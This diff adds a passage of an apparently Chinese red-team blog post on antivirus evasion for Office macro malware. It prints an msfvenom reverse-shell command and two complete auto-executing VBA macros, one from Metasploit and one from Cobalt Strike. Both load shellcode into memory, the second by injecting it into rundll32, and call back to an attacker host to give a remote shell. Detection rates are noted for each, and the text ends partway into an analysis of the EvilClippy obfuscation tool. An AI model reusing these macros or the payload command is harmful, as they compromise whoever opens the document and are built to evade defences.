@@ -1,0 +1,655 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>宏免杀分析 // Y4ph3tS blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.139.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Y4ph3tS" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="宏免杀分析">
+  <meta name="twitter:description" content="本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！
+宏病毒攻击方式的分析与研究 在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。
+什么是宏病毒 宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。
+宏病毒的危害 主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。
+宏病毒的生成 MSF生成宏 MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：
+msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.12.129 lport=4444 -f vba -o msf.vba 宏的内容如下：
+#If Vba7 ThenPrivate Declare PtrSafe Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtrPrivate Declare PtrSafe Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr#ElsePrivate Declare Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPrivate Declare Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPrivate Declare Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long#EndIfSub Auto_Open()Dim Ltw As Long, Eso As Variant, Ytpg As Long#If Vba7 ThenDim Tpgwi As LongPtr, Ivlfxyv As LongPtr#ElseDim Tpgwi As Long, Ivlfxyv As Long#EndIfEso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;H1000, &amp;H40)For Ytpg = LBound(Eso) To UBound(Eso)Ltw = Eso(Ytpg)Ivlfxyv = RtlMoveMemory(Tpgwi &#43; Ytpg, Ltw, 1)Next YtpgIvlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 使用msf进行监听，之后在word中运行宏即可获得shell">
+
+    <meta property="og:url" content="http://127.0.0.1:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/">
+  <meta property="og:site_name" content="Y4ph3tS blog">
+  <meta property="og:title" content="宏免杀分析">
+  <meta property="og:description" content="本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！
+宏病毒攻击方式的分析与研究 在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。
+什么是宏病毒 宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。
+宏病毒的危害 主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。
+宏病毒的生成 MSF生成宏 MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：
+msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.12.129 lport=4444 -f vba -o msf.vba 宏的内容如下：
+#If Vba7 ThenPrivate Declare PtrSafe Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtrPrivate Declare PtrSafe Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr#ElsePrivate Declare Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPrivate Declare Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPrivate Declare Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long#EndIfSub Auto_Open()Dim Ltw As Long, Eso As Variant, Ytpg As Long#If Vba7 ThenDim Tpgwi As LongPtr, Ivlfxyv As LongPtr#ElseDim Tpgwi As Long, Ivlfxyv As Long#EndIfEso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;H1000, &amp;H40)For Ytpg = LBound(Eso) To UBound(Eso)Ltw = Eso(Ytpg)Ivlfxyv = RtlMoveMemory(Tpgwi &#43; Ytpg, Ltw, 1)Next YtpgIvlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 使用msf进行监听，之后在word中运行宏即可获得shell">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-11-04T10:24:11+08:00">
+    <meta property="article:modified_time" content="2020-11-04T10:24:11+08:00">
+    <meta property="article:tag" content="红队技术">
+    <meta property="article:tag" content="免杀">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://127.0.0.1:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <span class="app-header-title">Y4ph3tS blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Valar Morghulis</p>
+      <div class="app-header-social">
+        
+          <a href="https://yaphetszz.github.com" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">宏免杀分析</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Nov 4, 2020
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          
+          37732 Words - 
+          
+          75 min read
+        </div>
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="http://127.0.0.1:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="http://127.0.0.1:1313/tags/%E5%85%8D%E6%9D%80/">免杀</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><strong>本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！</strong></p>
+<h1 id="宏病毒攻击方式的分析与研究">宏病毒攻击方式的分析与研究</h1>
+<p>在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。</p>
+<h2 id="什么是宏病毒">什么是宏病毒</h2>
+<p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p>
+<h2 id="宏病毒的危害">宏病毒的危害</h2>
+<p>主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。</p>
+<h2 id="宏病毒的生成">宏病毒的生成</h2>
+<h3 id="msf生成宏">MSF生成宏</h3>
+<p>MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp lhost<span style="color:#f92672">=</span>172.16.12.129 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f vba -o msf.vba
+</span></span></code></pre></div><p>宏的内容如下：</p>
+<pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">#If Vba7 Then
+	Private Declare PtrSafe Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtr
+	Private Declare PtrSafe Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtr
+	Private Declare PtrSafe Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr
+#Else
+	Private Declare Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As Long
+	Private Declare Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As Long
+	Private Declare Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+	Dim Ltw As Long, Eso As Variant, Ytpg As Long
+#If Vba7 Then
+	Dim  Tpgwi As LongPtr, Ivlfxyv As LongPtr
+#Else
+	Dim  Tpgwi As Long, Ivlfxyv As Long
+#EndIf
+	Eso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
+207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _
+0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _
+131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _
+255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)
+
+	Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;H1000, &amp;H40)
+	For Ytpg = LBound(Eso) To UBound(Eso)
+		Ltw = Eso(Ytpg)
+		Ivlfxyv = RtlMoveMemory(Tpgwi + Ytpg, Ltw, 1)
+	Next Ytpg
+	Ivlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+</code></pre><p>使用msf进行监听，之后在word中运行宏即可获得shell</p>
+<p><img src="../img/3.png" alt=""></p>
+<p>直接以docm形式保存，不做任何处理时该病毒在线扫描结果如下，报毒率为（38/66）：</p>
+<p><img src="../img/6.png" alt=""></p>
+<p>以doc形式保存时更高(40/64):</p>
+<p><img src="../img/7.png" alt=""></p>
+<h3 id="cobaltstrike宏生成">CobaltStrike宏生成</h3>
+<p>通过Attacks&gt;Packages&gt;MS Office Macro进行生成，生成后的代码如下：</p>
+<pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+
+#If VBA7 Then
+    Private Declare PtrSafe Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
+    Private Declare PtrSafe Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
+    Private Declare PtrSafe Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#Else
+    Private Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
+    Private Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+    Private Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
+    Private Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#End If
+
+Sub Auto_Open()
+    Dim myByte As Long, myArray As Variant, offset As Long
+    Dim pInfo As PROCESS_INFORMATION
+    Dim sInfo As STARTUPINFO
+    Dim sNull As String
+    Dim sProc As String
+
+#If VBA7 Then
+    Dim rwxpage As LongPtr, res As LongPtr
+#Else
+    Dim rwxpage As Long, res As Long
+#End If
+    myArray = Array(-4, -24, -119, 0, 0, 0, 96, -119, -27, 49, -46, 100, -117, 82, 48, -117, 82, 12, -117, 82, 20, -117, 114, 40, 15, -73, 74, 38, 49, -1, 49, -64, -84, _
+60, 97, 124, 2, 44, 32, -63, -49, 13, 1, -57, -30, -16, 82, 87, -117, 82, 16, -117, 66, 60, 1, -48, -117, 64, 120, -123, -64, 116, 74, 1, -48, _
+80, -117, 72, 24, -117, 88, 32, 1, -45, -29, 60, 73, -117, 52, -117, 1, -42, 49, -1, 49, -64, -84, -63, -49, 13, 1, -57, 56, -32, 117, -12, 3, _
+125, -8, 59, 125, 36, 117, -30, 88, -117, 88, 36, 1, -45, 102, -117, 12, 75, -117, 88, 28, 1, -45, -117, 4, -117, 1, -48, -119, 68, 36, 36, 91, _
+91, 97, 89, 90, 81, -1, -32, 88, 95, 90, -117, 18, -21, -122, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, -1, _
+-43, -24, -128, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, _
+83, 73, 69, 32, 57, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 87, 79, 87, 54, 52, 59, 32, _
+84, 114, 105, 100, 101, 110, 116, 47, 53, 46, 48, 59, 32, 66, 79, 73, 69, 57, 59, 69, 78, 85, 83, 83, 69, 77, 41, 0, 88, 88, 88, 88, _
+88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, 88, _
+88, 88, 88, 88, 88, 0, 89, 49, -1, 87, 87, 87, 87, 81, 104, 58, 86, 121, -89, -1, -43, -21, 121, 91, 49, -55, 81, 81, 106, 3, 81, 81, _
+104, 92, 17, 0, 0, 83, 80, 104, 87, -119, -97, -58, -1, -43, -21, 98, 89, 49, -46, 82, 104, 0, 2, 96, -124, 82, 82, 82, 81, 82, 80, 104, _
+-21, 85, 46, 59, -1, -43, -119, -58, 49, -1, 87, 87, 87, 87, 86, 104, 45, 6, 24, 123, -1, -43, -123, -64, 116, 68, 49, -1, -123, -10, 116, 4, _
+-119, -7, -21, 9, 104, -86, -59, -30, 93, -1, -43, -119, -63, 104, 69, 33, 94, 49, -1, -43, 49, -1, 87, 106, 7, 81, 86, 80, 104, -73, 87, -32, _
+11, -1, -43, -65, 0, 47, 0, 0, 57, -57, 116, -68, 49, -1, -21, 21, -21, 73, -24, -103, -1, -1, -1, 47, 109, 97, 77, 65, 0, 0, 104, -16, _
+-75, -94, 86, -1, -43, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 87, 104, 88, -92, 83, -27, -1, -43, -109, 83, 83, -119, -25, 87, 104, _
+0, 32, 0, 0, 83, 86, 104, 18, -106, -119, -30, -1, -43, -123, -64, 116, -51, -117, 7, 1, -61, -123, -64, 117, -27, 88, -61, -24, 55, -1, -1, -1, _
+49, 55, 50, 46, 49, 54, 46, 49, 50, 46, 49, 50, 57, 0)
+    If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 Then
+        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;
+    Else
+        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;
+    End If
+
+    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)
+
+    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
+    For offset = LBound(myArray) To UBound(myArray)
+        myByte = myArray(offset)
+        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
+    Next offset
+    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
+</code></pre><p>使用宏在word中运行后即可在CS中获取到shell</p>
+<p><img src="../img/4.png" alt=""></p>
+<p>直接以docm形式保存，不做任何处理时该病毒在线扫描结果如下，报毒率为41/66：</p>
+<p><img src="../img/5.png" alt=""></p>
+<p>以doc保存时（42/64）</p>
+<p><img src="../img/8.png" alt=""></p>
+<h2 id="常见免杀方式剖析">常见免杀方式剖析</h2>
+<h3 id="evilclippy">EvilClippy</h3>
+<p>根据资料来看，通过混淆的方式绕过杀软还是非常有效的，最常见的混淆工具为evilclippy，工具地址为：https://github.com/outflanknl/EvilClippy</p>
+<h4 id="代码分析">代码分析</h4>
+<p>该工具于2019年3月在BlackHat大会上发布，主要组成如下：</p>
+<p><img src="../img/1.png" alt=""></p>
+<p>先gitclone下来看看源码，从主程序开始分析。</p>
+<p>程序的引用如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> OpenMcdf;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Text;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Collections.Generic;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Kavod.Vba.Compression;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Linq;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> NDesk.Options;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Net;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Threading;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO.Compression;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Text.RegularExpressions;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Collections;
+</span></span></code></pre></div><p>首先对引用进行分析，除去C#中常见的固有组件，剩下的引用主要为OpenMcdf，Kavod.Vba.Compression，NDesk.Options</p>
+<p>其中Openmcdf为结构化储存的.NET组件，其GitHub上仓库地址如下：</p>
+<p><a href="https://github.com/ironfede/openmcdf">https://github.com/ironfede/openmcdf</a></p>
+<p>该库允许用户对符合的文档进行操作，例如创建新文件，打开存在的文件并调用其中的流数据添加数据并进行储存等。</p>
+<p>Kavod.Vba.Compression是一款用于压缩MS Office中的VBA脚本的C#程序，其GitHub仓库地址如下：</p>
